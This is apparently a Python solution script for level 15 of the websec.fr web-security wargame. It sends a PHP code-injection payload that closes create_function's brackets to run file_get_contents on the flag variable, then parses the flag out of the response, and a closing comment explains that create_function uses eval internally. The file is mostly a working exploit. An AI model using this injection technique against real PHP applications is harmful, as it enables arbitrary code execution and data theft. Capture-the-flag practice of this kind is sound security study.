from requests import *

level = 15
if(level < 10):
    level = "0" + str(level)

url = f"https://websec.fr/level{level}/index.php"

payload = '} echo file_get_contents($flag); {'
data = {
    "c": payload,
#    "q": "0", # Exit after declaration
    "submit": "Submit"
}


r = post(url, data=data).text
s = r.find("WEBSEC")
e = r.find("}", s) + 1
print(r[s:e])

"""
When you search for `create_function` in php docs you get this msg lol:
```
Warning

This function has been DEPRECATED as of PHP 7.2.0,
and REMOVED as of PHP 8.0.0. Relying on this function is highly discouraged.
```
and they also tells us this function uses eval internally on our input, so
we can a trick similar to sqli, and close the functions brackets, then inject
our desired code!
"""
